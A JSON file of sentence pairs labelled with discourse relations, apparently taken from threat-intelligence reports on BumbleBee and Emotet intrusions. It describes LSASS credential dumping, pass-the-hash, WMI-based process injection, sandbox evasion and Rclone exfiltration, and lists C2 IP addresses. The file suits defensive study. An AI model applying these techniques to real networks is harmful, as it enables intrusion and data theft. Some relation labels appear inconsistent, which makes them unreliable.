        "S2": "We have observed the same behavior with other major malware distributors in previous reports:",
        "relation": "ELABORATION"
    },
    {
        "S1": "We have observed the same behavior with other major malware distributors in previous reports:",
        "S2": "Using the event log, \u201cMicrosoft-Windows-VHDMP-Operational.evtx\u201d, we can quickly find when the user mounted the .iso.",
        "relation": "MISC"
    },
    {
        "S1": "Using the event log, \u201cMicrosoft-Windows-VHDMP-Operational.evtx\u201d, we can quickly find when the user mounted the .iso.",
        "S2": "Upon clicking the LNK file the BumbleBee payload was executed.",
        "relation": "MISC"
    },
    {
        "S1": "Upon clicking the LNK file the BumbleBee payload was executed.",
        "S2": "Following the user mounting the .iso file, they clicked on a .lnk file documents.lnk .",
        "relation": "NEXT"
    },
    {
        "S1": "Following the user mounting the .iso file, they clicked on a .lnk file documents.lnk .",
        "S2": "As noted in previous reports, the .dll is hidden from the user unless they display hidden items in explorer like so:",
        "relation": "MISC"
    },
    {
        "S1": "As noted in previous reports, the .dll is hidden from the user unless they display hidden items in explorer like so:",
        "S2": "The .lnk contains instructions to execute a specific exported function with the BumbleBee DLL file.",
        "relation": "MISC"
    },
    {
        "S1": "The .lnk contains instructions to execute a specific exported function with the BumbleBee DLL file.",
        "S2": "When the .lnk was doubled clicked by the user, the BumbleBee malware tamirlan.dll was executed:",
        "relation": "NEXT"
    },
    {
        "S1": "When the .lnk was doubled clicked by the user, the BumbleBee malware tamirlan.dll was executed:",
        "S2": "The output of LECmd.exe, when used on documents.lnk , provided additional context to where and when this .lnk file was created:",
        "relation": "MISC"
    },
    {
        "S1": "The output of LECmd.exe, when used on documents.lnk , provided additional context to where and when this .lnk file was created:",
        "S2": ">> Tracker database block Machine ID: user-pc MAC Address: 9a:5b:d6:3e:47:ec MAC Vendor: (Unknown vendor) Creation: <REDACTED DATE>",
        "relation": "MISC"
    },
    {
        "S1": ">> Tracker database block Machine ID: user-pc MAC Address: 9a:5b:d6:3e:47:ec MAC Vendor: (Unknown vendor) Creation: <REDACTED DATE>",
        "S2": "Approximately 5 seconds after execution, the rundll32.exe process contacted the IP 154.56.0.221 .",
        "relation": "MISC"
    },
    {
        "S1": "Approximately 5 seconds after execution, the rundll32.exe process contacted the IP 154.56.0.221 .",
        "S2": "More information on this traffic is covered in the Command and Control section below.",
        "relation": "ELABORATION"
    },
    {
        "S1": "More information on this traffic is covered in the Command and Control section below.",
        "S2": "An interesting tactic of note, was the use of WMI and COM function calls to start the process, used to inject into.",
        "relation": "MISC"
    },
    {
        "S1": "An interesting tactic of note, was the use of WMI and COM function calls to start the process, used to inject into.",
        "S2": "The BumbleBee loader uses WMI to start new process by calling COM functions to create a new process.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The BumbleBee loader uses WMI to start new process by calling COM functions to create a new process.",
        "S2": "Below you can see the COM instance creation followed by defining the WMI namespace and WMI object being created \u2013 \u201cWin32_Process\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Below you can see the COM instance creation followed by defining the WMI namespace and WMI object being created \u2013 \u201cWin32_Process\u201d.",
        "S2": "Analysis of the loader found that a function of the malware chooses 1 of 3 target processes before injecting the supplied code:",
        "relation": "MISC"
    },
    {
        "S1": "Analysis of the loader found that a function of the malware chooses 1 of 3 target processes before injecting the supplied code:",
        "S2": "This resulted in new processes not being a child of BumbleBee, but rather WmiPrvSE.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "This resulted in new processes not being a child of BumbleBee, but rather WmiPrvSE.exe.",
        "S2": "In this intrusion, an instance of C:\\Program Files\\Windows Photo Viewer\\ImagingDevices.exe was created and accessed by the BumbleBee rundll32.exe process.",
        "relation": "MISC"
    },
    {
        "S1": "In this intrusion, an instance of C:\\Program Files\\Windows Photo Viewer\\ImagingDevices.exe was created and accessed by the BumbleBee rundll32.exe process.",
        "S2": "Shortly after this interaction, the process started communicating to a Meterpreter C2 3.85.198.66 .",
        "relation": "NEXT"
    },
    {
        "S1": "Shortly after this interaction, the process started communicating to a Meterpreter C2 3.85.198.66 .",
        "S2": "This process spawned cmd.exe and several typical discovery commands that are covered in more detail below.",
        "relation": "NEXT"
    },
    {
        "S1": "This process spawned cmd.exe and several typical discovery commands that are covered in more detail below.",
        "S2": "The second process, was spawned the WMI technique was an instance of C:\\Program Files\\Windows Mail\\wabmig.exe .",
        "relation": "MISC"
    },
    {
        "S1": "The second process, was spawned the WMI technique was an instance of C:\\Program Files\\Windows Mail\\wabmig.exe .",
        "S2": "This process was used to host both a session to another Meterpreter C2 50.16.62.87 and a Cobalt Strike C2 server 45.153.243.142, which was then used to conduct the majority of additional activity including credential dumping and discovery exercises highlighted below.",
        "relation": "NEXT"
    },
    {
        "S1": "This process was used to host both a session to another Meterpreter C2 50.16.62.87 and a Cobalt Strike C2 server 45.153.243.142, which was then used to conduct the majority of additional activity including credential dumping and discovery exercises highlighted below.",
        "S2": "The pivot to using Cobalt Strike began around 6 hours after the execution of the BumbleBee loader.",
        "relation": "MISC"
    },
    {
        "S1": "The pivot to using Cobalt Strike began around 6 hours after the execution of the BumbleBee loader.",
        "S2": "A new local administrator user was created on a server to facilitate persistence on the machine.",
        "relation": "MISC"
    },
    {
        "S1": "A new local administrator user was created on a server to facilitate persistence on the machine.",
        "S2": "The user account was observed to be accessed via an AnyDesk session on the same machine.",
        "relation": "MISC"
    },
    {
        "S1": "The user account was observed to be accessed via an AnyDesk session on the same machine.",
        "S2": "In addition, AnyDesk was installed as a service:",
        "relation": "NEXT"
    },
    {
        "S1": "In addition, AnyDesk was installed as a service:",
        "S2": "The BumbleBee loader itself uses several defense evasion and anti-analysis techniques.",
        "relation": "MISC"
    },
    {
        "S1": "The BumbleBee loader itself uses several defense evasion and anti-analysis techniques.",
        "S2": "As detailed in the Execution section, the use of WMI to spawn new processes is a known technique to evade any parent/child process heuristics or detections.",
        "relation": "MISC"
    },
    {
        "S1": "As detailed in the Execution section, the use of WMI to spawn new processes is a known technique to evade any parent/child process heuristics or detections.",
        "S2": "Once the malware is unpacked, it becomes quite apparent to what the malware author(s) were looking for\u2013",
        "relation": "MISC"
    },
    {
        "S1": "Once the malware is unpacked, it becomes quite apparent to what the malware author(s) were looking for\u2013",
        "S2": "Known malware analysis process names running:",
        "relation": "MISC"
    },
    {
        "S1": "Known malware analysis process names running:",
        "S2": "Known sandbox usernames (Sorry if your name is Peter Wilson, no malware for you \ud83d\ude1f):",
        "relation": "ELABORATION"
    },
    {
        "S1": "Known sandbox usernames (Sorry if your name is Peter Wilson, no malware for you \ud83d\ude1f):",
        "S2": "Specific Virtualization Software files on disk and registry keys (Virtual Box, Qemu, Parallels), example:",
        "relation": "MISC"
    },
    {
        "S1": "Specific Virtualization Software files on disk and registry keys (Virtual Box, Qemu, Parallels), example:",
        "S2": "Create Remote Thread \u2013 The malware used the win32 function CreateRemoteThread in order to execute code in rundll32.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Create Remote Thread \u2013 The malware used the win32 function CreateRemoteThread in order to execute code in rundll32.exe.",
        "S2": "Named Pipes \u2013 Two named pipes were created in order to establish inter-process communications (IPC) between rundll32.exe and wabmig.exe.",
        "relation": "LIST"
    },
    {
        "S1": "Named Pipes \u2013 Two named pipes were created in order to establish inter-process communications (IPC) between rundll32.exe and wabmig.exe.",
        "S2": "A remote service was created on one of the workstations in order to dump lsass.",
        "relation": "MISC"
    },
    {
        "S1": "A remote service was created on one of the workstations in order to dump lsass.",
        "S2": "The first discovery stage includes TTPs that we have seen in multiple cases, such as trusts discovery, domain admin group discovery, network discovery and process enumeration.",
        "relation": "MISC"
    },
    {
        "S1": "The first discovery stage includes TTPs that we have seen in multiple cases, such as trusts discovery, domain admin group discovery, network discovery and process enumeration.",
        "S2": "AdFind.exe was renamed to af.exe and was used by threat actors in order to enumerate AD users, computers, OU, trusts, subnets and groups.",
        "relation": "MISC"
    },
    {
        "S1": "AdFind.exe was renamed to af.exe and was used by threat actors in order to enumerate AD users, computers, OU, trusts, subnets and groups.",
        "S2": "The threat actor was observed moving via RDP throughout the network with a Domain Admin account.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor was observed moving via RDP throughout the network with a Domain Admin account.",
        "S2": "As mentioned in Credential Access, the threat actor used remote services to execute commands on remote hosts.",
        "relation": "MISC"
    },
    {
        "S1": "As mentioned in Credential Access, the threat actor used remote services to execute commands on remote hosts.",
        "S2": "SMB was used to transfer the various tools laterally, as needed in the environment, like procdump.exe and AnyDesk executables.",
        "relation": "MISC"
    },
    {
        "S1": "SMB was used to transfer the various tools laterally, as needed in the environment, like procdump.exe and AnyDesk executables.",
        "S2": "The threat actor accessed multiple documents and folders from a remote file server.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor accessed multiple documents and folders from a remote file server.",
        "S2": "The SMB share was accessed through a compromised server via an AnyDesk session.",
        "relation": "MISC"
    },
    {
        "S1": "The SMB share was accessed through a compromised server via an AnyDesk session.",
        "S2": "The lsass dump file ran remotely, was copied to the beachhead through the admin share C$.",
        "relation": "MISC"
    },
    {
        "S1": "The lsass dump file ran remotely, was copied to the beachhead through the admin share C$.",
        "S2": "After being copied, the file was zipped using 7za.exe (7-zip), in preparation for exfiltration.",
        "relation": "NEXT"
    },
    {
        "S1": "After being copied, the file was zipped using 7za.exe (7-zip), in preparation for exfiltration.",
        "S2": "This C2 server was observed in a previous BumbleBee case.",
        "relation": "MISC"
    },
    {
        "S1": "This C2 server was observed in a previous BumbleBee case.",
        "S2": "AnyDesk was installed to facilitate interactive desktop command and control access to a server in the environment.",
        "relation": "MISC"
    },
    {
        "S1": "AnyDesk was installed to facilitate interactive desktop command and control access to a server in the environment.",
        "S2": "Reviewing the ad_svc.trace logs from Anydesk located in %programdata%\\AnyDesk reveal the logins originating from 108.177.235.25.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Reviewing the ad_svc.trace logs from Anydesk located in %programdata%\\AnyDesk reveal the logins originating from 108.177.235.25.",
        "S2": "This was again the same IP observered in the prior Bumblebee case.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This was again the same IP observered in the prior Bumblebee case.",
        "S2": "The Client-ID observed in the logs was 892647610",
        "relation": "MISC"
    },
    {
        "S1": "The Client-ID observed in the logs was 892647610",
        "S2": "No exfiltration methods were observed beyond the established command and control channels, which can be assessed as likely used to take data like the lsass dump out of the network.",
        "relation": "MISC"
    },
    {
        "S1": "No exfiltration methods were observed beyond the established command and control channels, which can be assessed as likely used to take data like the lsass dump out of the network.",
        "S2": "The threat actors were evicted from the network before any further impact.",
        "relation": "NEXT"
    },
    {
        "S1": "Back in May, we witnessed an intrusion that started from a phishing email which included Emotet.",
        "S2": "The intrusion lasted four days and contained many of the usual suspects, including the Cobalt Strike post-exploitation framework.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The intrusion lasted four days and contained many of the usual suspects, including the Cobalt Strike post-exploitation framework.",
        "S2": "The Emotet infection was delivered using a xls file containing a malicious macro, a technique that has been on the wane in recent months.",
        "relation": "MISC"
    },
    {
        "S1": "The Emotet infection was delivered using a xls file containing a malicious macro, a technique that has been on the wane in recent months.",
        "S2": "After executing the Emotet malware, it ran a few basic Windows discovery commands (systeminfo, ipconfig, etc.), wrote a registry run key for persistence, and made its initial call outs to the command and control servers.",
        "relation": "NEXT"
    },
    {
        "S1": "After executing the Emotet malware, it ran a few basic Windows discovery commands (systeminfo, ipconfig, etc.), wrote a registry run key for persistence, and made its initial call outs to the command and control servers.",
        "S2": "Around 40 minutes after the initial execution, the Emotet malware started to run a new Emotet email spreader campaign.",
        "relation": "NEXT"
    },
    {
        "S1": "Around 40 minutes after the initial execution, the Emotet malware started to run a new Emotet email spreader campaign.",
        "S2": "This entailed connecting to various email servers and sending new emails with attached xls and zip files.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This entailed connecting to various email servers and sending new emails with attached xls and zip files.",
        "S2": "This activity continued until the UTC clock turned over to the next day; at which point, the email spreader halted for a period of time and around seven hours into the second day, it began running the email spreader again.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This activity continued until the UTC clock turned over to the next day; at which point, the email spreader halted for a period of time and around seven hours into the second day, it began running the email spreader again.",
        "S2": "Around 26 hours after the initial infection, while still running the email spreader, the Emotet malware pulled down and executed a Cobalt Strike payload on the beachhead host.",
        "relation": "NEXT"
    },
    {
        "S1": "Around 26 hours after the initial infection, while still running the email spreader, the Emotet malware pulled down and executed a Cobalt Strike payload on the beachhead host.",
        "S2": "Right after the beacon was executed, the threat actors began enumerating the network using native Windows binaries and the PowerView module, Invoke-ShareFinder.",
        "relation": "NEXT"
    },
    {
        "S1": "Right after the beacon was executed, the threat actors began enumerating the network using native Windows binaries and the PowerView module, Invoke-ShareFinder.",
        "S2": "Around 30 minutes after dropping the beacon the threat actor injected into a dllhost.exe process and then proceeded to dump credentials from LSASS.",
        "relation": "NEXT"
    },
    {
        "S1": "Around 30 minutes after dropping the beacon the threat actor injected into a dllhost.exe process and then proceeded to dump credentials from LSASS.",
        "S2": "Another 20 minutes later, the threat actor ran Invoke-ShareFinder again and Invoke-Kerberoast.",
        "relation": "NEXT"
    },
    {
        "S1": "Another 20 minutes later, the threat actor ran Invoke-ShareFinder again and Invoke-Kerberoast.",
        "S2": "At 29 hours from initial access, the threat actors began their first lateral movement.",
        "relation": "NEXT"
    },
    {
        "S1": "At 29 hours from initial access, the threat actors began their first lateral movement.",
        "S2": "This was achieved by transferring a Cobalt Strike DLL over SMB and executing via a remote service on another workstation.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This was achieved by transferring a Cobalt Strike DLL over SMB and executing via a remote service on another workstation.",
        "S2": "From there, they ran Invoke-Sharefinder once again, along with AdFind, using a batch file named find.bat.",
        "relation": "NEXT"
    },
    {
        "S1": "From there, they ran Invoke-Sharefinder once again, along with AdFind, using a batch file named find.bat.",
        "S2": "Pass-the-Hash behavior was observed targeting several accounts on the lateral host.",
        "relation": "MISC"
    },
    {
        "S1": "Pass-the-Hash behavior was observed targeting several accounts on the lateral host.",
        "S2": "Use of Cobalt Strike\u2019s Get-System module was also apparent via the logs.",
        "relation": "MISC"
    },
    {
        "S1": "Use of Cobalt Strike\u2019s Get-System module was also apparent via the logs.",
        "S2": "The threat actors then proceeded to do additional network discovery using a batch script named p.bat to ping all servers in the network.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors then proceeded to do additional network discovery using a batch script named p.bat to ping all servers in the network.",
        "S2": "More account discovery was then observed, with queries for Domain Administrators and a backup account.",
        "relation": "NEXT"
    },
    {
        "S1": "More account discovery was then observed, with queries for Domain Administrators and a backup account.",
        "S2": "At 31 hours into the intrusion, the threat actors pivoted to the Domain Controller using the same Cobalt Strike DLL.",
        "relation": "NEXT"
    },
    {
        "S1": "At 31 hours into the intrusion, the threat actors pivoted to the Domain Controller using the same Cobalt Strike DLL.",
        "S2": "Once on the Domain Controller, the threat actors again used Get-System to elevate and then dumped LSASS.",
        "relation": "NEXT"
    },
    {
        "S1": "Once on the Domain Controller, the threat actors again used Get-System to elevate and then dumped LSASS.",
        "S2": "After completing that activity, the threat actors chose another server to push a file, 1.msi, to, which was the installation package for Atera\u2013for an additional means of persistence and command and control.",
        "relation": "NEXT"
    },
    {
        "S1": "After completing that activity, the threat actors chose another server to push a file, 1.msi, to, which was the installation package for Atera\u2013for an additional means of persistence and command and control.",
        "S2": "During this whole second day, the original Emotet infection on the beachhead host was still trying to send more malicious emails, finally stopping for the day a little before 23:00 UTC.",
        "relation": "MISC"
    },
    {
        "S1": "During this whole second day, the original Emotet infection on the beachhead host was still trying to send more malicious emails, finally stopping for the day a little before 23:00 UTC.",
        "S2": "They returned the next day, at the same time as the previous day, and picked up where they left off.",
        "relation": "NEXT"
    },
    {
        "S1": "They returned the next day, at the same time as the previous day, and picked up where they left off.",
        "S2": "They pivoted to a couple of workstations on the network using Cobalt Strike and installed Atera and Splashtop with a different MSI installer.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They pivoted to a couple of workstations on the network using Cobalt Strike and installed Atera and Splashtop with a different MSI installer.",
        "S2": "Once again, they executed Invoke-Sharefinder, AdFind, and the p.bat batch script to ping online servers.",
        "relation": "NEXT"
    },
    {
        "S1": "Once again, they executed Invoke-Sharefinder, AdFind, and the p.bat batch script to ping online servers.",
        "S2": "Using the remote admin tools, they used Rclone to exfiltrate important data from a file server and upload it to MEGA.",
        "relation": "NEXT"
    },
    {
        "S1": "Using the remote admin tools, they used Rclone to exfiltrate important data from a file server and upload it to MEGA.",
        "S2": "Interestingly, the threat actors exfiltrated the same data twice while running Rclone with the parameter \u2013ignore-existing from two different hosts on the network.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Interestingly, the threat actors exfiltrated the same data twice while running Rclone with the parameter \u2013ignore-existing from two different hosts on the network.",
        "S2": "Around 20:00 UTC the Emotet infection on the beachhead host began its email spreader activity again, only to halt at the change over at 00:00 UTC.",
        "relation": "NEXT"
    },
    {
        "S1": "Around 20:00 UTC the Emotet infection on the beachhead host began its email spreader activity again, only to halt at the change over at 00:00 UTC.",
        "S2": "On the last day of this intrusion, the threat actors returned during their normal working hours and used Rclone to exfiltrate IT-related data from a separate server.",
        "relation": "NEXT"
    },
    {
        "S1": "On the last day of this intrusion, the threat actors returned during their normal working hours and used Rclone to exfiltrate IT-related data from a separate server.",
        "S2": "This was the last activity we observed from this group.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This was the last activity we observed from this group.",
        "S2": "These cases commonly end up with ransomware in addition to data exfiltration.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These cases commonly end up with ransomware in addition to data exfiltration.",
        "S2": "This, however, was not the case with this intrusion as the threat actors were evicted before any final actions could be taken.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This, however, was not the case with this intrusion as the threat actors were evicted before any final actions could be taken.",
        "S2": "The threat actor gained access to the environment after a user opened an Excel document and enabled macros.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor gained access to the environment after a user opened an Excel document and enabled macros.",
        "S2": "The document came in via email in the form of a zip file which included an xls file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The document came in via email in the form of a zip file which included an xls file.",
        "S2": "Thanks for sharing @proxylife!",
        "relation": "MISC"
    },
    {
        "S1": "Thanks for sharing @proxylife!",
        "S2": "Mixture of lnk files and xls files being sent.",
        "relation": "MISC"
    },
    {
        "S1": "Mixture of lnk files and xls files being sent.",
        "S2": "I am playing catching up updating my git with IOC's!",
        "relation": "MISC"
    },
    {
        "S1": "I am playing catching up updating my git with IOC's!",
        "S2": "The document contains hidden sheets, has white characters on a white background, and is attributed to SilentBuilder with Emotet, epoch5.",
        "relation": "MISC"
    },
    {
        "S1": "The document contains hidden sheets, has white characters on a white background, and is attributed to SilentBuilder with Emotet, epoch5.",
        "S2": "To deobfuscate the document the tool xlmdeobfuscator was used with the following output.",
        "relation": "ELABORATION"
    },
    {
        "S1": "To deobfuscate the document the tool xlmdeobfuscator was used with the following output.",
        "S2": "After deobfuscation and cleaned up, the code in the macro looks as follows.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After deobfuscation and cleaned up, the code in the macro looks as follows.",
        "S2": "The execution is done from an Excel document using regsvr32.exe with the payload, hvxda.ocx, that is a DLL file with the name of random characters, llJyMIOvft.dll .",
        "relation": "ELABORATION"
    },
    {
        "S1": "The execution is done from an Excel document using regsvr32.exe with the payload, hvxda.ocx, that is a DLL file with the name of random characters, llJyMIOvft.dll .",
        "S2": "Worth noting, the Excel document failed to download the second payload from a few of the embedded URLs.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Worth noting, the Excel document failed to download the second payload from a few of the embedded URLs.",
        "S2": "A new file is then created in C:\\%USERPROFILE%\\AppData\\Local\\ with a folder that also consists of random characters.",
        "relation": "NEXT"
    },
    {
        "S1": "A new file is then created in C:\\%USERPROFILE%\\AppData\\Local\\ with a folder that also consists of random characters.",
        "S2": "The Emotet DLL is then used to download Cobalt Strike, which is then injected into svchost and dllhost.",
        "relation": "NEXT"
    },
    {
        "S1": "The Emotet DLL is then used to download Cobalt Strike, which is then injected into svchost and dllhost.",
        "S2": "Sysmon showing Emotet starting the Cobalt Strike executable.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Sysmon showing Emotet starting the Cobalt Strike executable.",
        "S2": "A great way to get the Malleable profile (and additional beacon config), is to use Didier Stevens\u2019s fantastic tool 1768.py.",
        "relation": "MISC"
    },
    {
        "S1": "A great way to get the Malleable profile (and additional beacon config), is to use Didier Stevens\u2019s fantastic tool 1768.py.",
        "S2": "Here, the tool is used with a process dump of the executable.",
        "relation": "MISC"
    },
    {
        "S1": "Here, the tool is used with a process dump of the executable.",
        "S2": "The Emotet malware infection on the beachhead host used a registry run key to maintain persistence.",
        "relation": "MISC"
    },
    {
        "S1": "The Emotet malware infection on the beachhead host used a registry run key to maintain persistence.",
        "S2": "This registry key activity (Sysmon EventID 12 & 13) was observed continuously on the beachhead host for the first few days of the intrusion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This registry key activity (Sysmon EventID 12 & 13) was observed continuously on the beachhead host for the first few days of the intrusion.",
        "S2": "Beyond the beachhead host, the threat actor deployed several Atera/Splashtop remote access tools across the environment as an alternative means of access to the environment should they lose access to their Cobalt Strike beacons.",
        "relation": "MISC"
    },
    {
        "S1": "Beyond the beachhead host, the threat actor deployed several Atera/Splashtop remote access tools across the environment as an alternative means of access to the environment should they lose access to their Cobalt Strike beacons.",
        "S2": "Use of Cobalt Strike\u2019s Get-System named pipe technique was observed on the Domain Controller and other hosts to elevate to System privileges.",
        "relation": "MISC"
    },
    {
        "S1": "Use of Cobalt Strike\u2019s Get-System named pipe technique was observed on the Domain Controller and other hosts to elevate to System privileges.",
        "S2": "Process injection was observed during the intrusion by both Emotet and Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "Process injection was observed during the intrusion by both Emotet and Cobalt Strike.",
        "S2": "Emotet injected multiple times into svchost to execute certain functions, including discovery commands.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Emotet injected multiple times into svchost to execute certain functions, including discovery commands.",
        "S2": "Cobalt Strike used process hollowing to launch under the context of the Dllhost.exe process.",
        "relation": "MISC"
    },
    {
        "S1": "Cobalt Strike used process hollowing to launch under the context of the Dllhost.exe process.",
        "S2": "We later saw Dllhost.exe injecting into multiple other processes, such as explorer.exe and svchost.exe, to execute further payloads.",
        "relation": "NEXT"
    },
    {
        "S1": "We later saw Dllhost.exe injecting into multiple other processes, such as explorer.exe and svchost.exe, to execute further payloads.",
        "S2": "Scanning process memory across affected hosts reveals both the direct Cobalt Strike processes and the injected processes using the Malpedia yara rule.",
        "relation": "NEXT"
    },
    {
        "S1": "Scanning process memory across affected hosts reveals both the direct Cobalt Strike processes and the injected processes using the Malpedia yara rule.",
        "S2": "From the beachhead host credentials appear to have been dumped from an injection into the SearchIndexer process on the host.",
        "relation": "MISC"
    },
    {
        "S1": "From the beachhead host credentials appear to have been dumped from an injection into the SearchIndexer process on the host.",
        "S2": "Data observed using sysmon event id 10 shows the use of the SearchIndexer process, similar to behavior observed in a prior case, followed by known Cobalt Strike malleable profile named pipes.",
        "relation": "MISC"
    },
    {
        "S1": "Data observed using sysmon event id 10 shows the use of the SearchIndexer process, similar to behavior observed in a prior case, followed by known Cobalt Strike malleable profile named pipes.",
        "S2": "Shortly after the credential dump using the SearchIndexer process, the Cobalt Strike process ran Invoke-Kerberoast looking for roastable accounts within the organization.",
        "relation": "NEXT"
    },
    {
        "S1": "Shortly after the credential dump using the SearchIndexer process, the Cobalt Strike process ran Invoke-Kerberoast looking for roastable accounts within the organization.",
        "S2": "We observed Cobalt Strike beacons accessing LSASS on multiple occasions, on almost every compromised host.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We observed Cobalt Strike beacons accessing LSASS on multiple occasions, on almost every compromised host.",
        "S2": "On the first day of the intrusion, the Emotet malware performed some basic discovery tasks on the host using built in Windows utilities.",
        "relation": "MISC"
    },
    {
        "S1": "On the first day of the intrusion, the Emotet malware performed some basic discovery tasks on the host using built in Windows utilities.",
        "S2": "On the second day, the hands on activity from Cobalt Strike performed a more thorough examination of that host\u2019s Windows domain.",
        "relation": "NEXT"
    },
    {
        "S1": "On the second day, the hands on activity from Cobalt Strike performed a more thorough examination of that host\u2019s Windows domain.",
        "S2": "The threat actors launched the PowerView module, Invoke-Sharefinder, from almost all of the hosts to which they pivoted, including the domain controller.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors launched the PowerView module, Invoke-Sharefinder, from almost all of the hosts to which they pivoted, including the domain controller.",
        "S2": "AdFind.exe, the command-line Active Directory query tool, was run on only one of the compromised hosts via the find.bat batch script.",
        "relation": "ELABORATION"
    },
    {
        "S1": "AdFind.exe, the command-line Active Directory query tool, was run on only one of the compromised hosts via the find.bat batch script.",
        "S2": "The contents of the script are below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The contents of the script are below:",
        "S2": "Using the data collected from previous activity, they created a target list which was then fed to a batch script named p.bat.",
        "relation": "MISC"
    },
    {
        "S1": "Using the data collected from previous activity, they created a target list which was then fed to a batch script named p.bat.",
        "S2": "The batch file contained one line, which pinged a list of servers (servers.txt).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The batch file contained one line, which pinged a list of servers (servers.txt).",
        "S2": "The line can be seen below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The line can be seen below:",
        "S2": "Additionally, the threat actors displayed the share directories using dir.exe via the interactive shell from the Cobalt Strike beacon.",
        "relation": "MISC"
    },
    {
        "S1": "Additionally, the threat actors displayed the share directories using dir.exe via the interactive shell from the Cobalt Strike beacon.",
        "S2": "The Cobalt Strike jump psexec (Run service EXE on the remote host) produced a 7045 System Windows event on remote hosts.",
        "relation": "MISC"
    },
    {
        "S1": "The Cobalt Strike jump psexec (Run service EXE on the remote host) produced a 7045 System Windows event on remote hosts.",
        "S2": "Example:",
        "relation": "MISC"
    },
    {
        "S1": "Example:",
        "S2": "Below, the network traffic shows the SMB lateral transfer of one of the Atera Agent MSI installers (1.msi) used to gain access laterally on a host and provide persistence for later access.",
        "relation": "MISC"
    },
    {
        "S1": "Below, the network traffic shows the SMB lateral transfer of one of the Atera Agent MSI installers (1.msi) used to gain access laterally on a host and provide persistence for later access.",
        "S2": "The same can be observed for other payloads used during the intrusion as well; here we can see that same data using Zeek logs when the threat actors transferred the 1.dll Cobalt Strike beacon laterally to gain access to additional hosts.",
        "relation": "MISC"
    },
    {
        "S1": "The same can be observed for other payloads used during the intrusion as well; here we can see that same data using Zeek logs when the threat actors transferred the 1.dll Cobalt Strike beacon laterally to gain access to additional hosts.",
        "S2": "We also observed Pass-The-Hash used throughout the intrusion via the Cobalt Strike Beacons.",
        "relation": "MISC"
    },
    {
        "S1": "We also observed Pass-The-Hash used throughout the intrusion via the Cobalt Strike Beacons.",
        "S2": "Threat actors used PTH to acquire a session with elevated user access.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Threat actors used PTH to acquire a session with elevated user access.",
        "S2": "We observed the below logs being generated on the source host and domain controller that indicate the use of PTH.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We observed the below logs being generated on the source host and domain controller that indicate the use of PTH.",
        "S2": "Source Host:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Source Host:",
        "S2": "Domain Controller:",
        "relation": "LIST"
    },
    {
        "S1": "Domain Controller:",
        "S2": "You can read more about detecting \u201cPass-The-Hash\u201d here by Stealthbits and here by Hausec.",
        "relation": "MISC"
    },
    {
        "S1": "You can read more about detecting \u201cPass-The-Hash\u201d here by Stealthbits and here by Hausec.",
        "S2": "In the Emotet Excel document, the following URLs are hard coded, and obfuscated, to download the second stage.",
        "relation": "MISC"
    },
    {
        "S1": "In the Emotet Excel document, the following URLs are hard coded, and obfuscated, to download the second stage.",
        "S2": "The second stage of Emotet has a set of hard-coded IPs that it tries to connect to after the DLL is executed.",
        "relation": "NEXT"
    },
    {
        "S1": "The second stage of Emotet has a set of hard-coded IPs that it tries to connect to after the DLL is executed.",
        "S2": "Emotet, later on, deployed Cobalt Strike for additional functionality.",
        "relation": "NEXT"
    },
    {
        "S1": "Emotet, later on, deployed Cobalt Strike for additional functionality.",
        "S2": "Threat actors used Atera and Splashtop remote access tools on two compromised hosts during the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "Threat actors used Atera and Splashtop remote access tools on two compromised hosts during the intrusion.",
        "S2": "Atera granted the threat actors with interactive access.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Atera granted the threat actors with interactive access.",
        "S2": "We cannot, however, confirm that the threat actors utilized this access because the majority of activity originated through the Cobalt Strike beacons.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We cannot, however, confirm that the threat actors utilized this access because the majority of activity originated through the Cobalt Strike beacons.",
        "S2": "The threat actors used Rclone to exfiltrate sensitive data to MEGA.io cloud storage.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors used Rclone to exfiltrate sensitive data to MEGA.io cloud storage.",
        "S2": "Command line logging revealed the destination to be the Mega service and the network shares targeted.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Command line logging revealed the destination to be the Mega service and the network shares targeted.",
        "S2": "This activity was also visible on the network via Zeek logs showing the SMB share connection activity.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This activity was also visible on the network via Zeek logs showing the SMB share connection activity.",
        "S2": "Emotet has for some time been used as an initial access broker for various intrusions; however, some Emotet infections get tasked with continuing the delivery of new campaigns.",
        "relation": "MISC"
    },
    {
        "S1": "Emotet has for some time been used as an initial access broker for various intrusions; however, some Emotet infections get tasked with continuing the delivery of new campaigns.",
